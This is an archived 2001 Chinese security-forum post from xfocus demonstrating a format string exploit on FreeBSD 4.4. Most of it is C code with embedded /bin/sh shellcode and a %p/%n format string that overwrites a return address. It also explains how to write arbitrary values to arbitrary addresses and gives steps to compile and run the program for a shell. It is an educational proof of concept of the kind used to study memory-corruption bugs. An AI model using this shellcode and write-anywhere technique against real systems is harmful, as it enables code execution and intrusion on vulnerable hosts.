---
title: "FreeBSD格式化字符串简单演示"
date: 2001-11-18T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-310"
---

(inburst_at_263.net)

发信人：watercloud（watercloud），信区：网络安全

标��题：FreeBSD格式化字符串简单演示 

发信站：安全焦点（2001-11-18 22:05:46） 

/* simple example for printf ex on FreeBSD */ 

#include<stdio.h> 

char shell[]= 

"1\xc0t\f_PPWW\x88G\a\xb0;\xcd\x80\xe8\xef\xff\xff\xff/bin/sh"; 

long addr,length=shell-152; 

char *pc = (char *)&addr; 

int main(int argc,char * argv[]) 

{ 

  long p[1]; 

  char buff[76]; 

  addr = (long ) &p[2]; 

  sprintf(buff,"%%p%%p%%p%%p%%p%%p%%p%%p%%p%%p%%p%%p%%p%%p%%p%%p%%%up\ 

    %%nCCC%c%c%c%c",length,pc[0],pc[1],pc[2],pc[3]); 

  printf(buff);  //所有的安全问题都在这，我们就是通过这得到shell的 ^_* 

} 


这样我们通过修改addr和length就能修改任意地址，写入任意内容 

addr就是我们将要修改的地址 

length+17x4+7 就是我们要填入的内容 

在这儿addr=&p[2]就是main的返回地址 buff-28就是print返回地址 . . . . 

length+17x4+7即为shell的地址，这样就回到了shell上运行得到了一个shell 

当然你也可以指定addr为printf函数返回地址等 . . .  . 

gcc printfex.c -o ex 

./ex >/dev/null            #为了防止打印太多东西  从定向(要不然shell出现之前得要打印几分钟) 

好了现在什么也没有显示了，shell的输出都被从定向到/dev/null下了呵呵 

随便敲一个 touch /tmp/testtest 

exit 

好了回到shell了去看看/tmp/testtest产生了没有. 


//说明，本文不是入门级的，如果有什么不清楚请参阅网上相应文章 

//最好建议自己打开gdb来调试 

//Tested on FreeBSD4.4 

                __ by watercloud __


--

※ 来源:・安全焦点讨论区 [www.xfocus.org](http://www.xfocus.org/)・
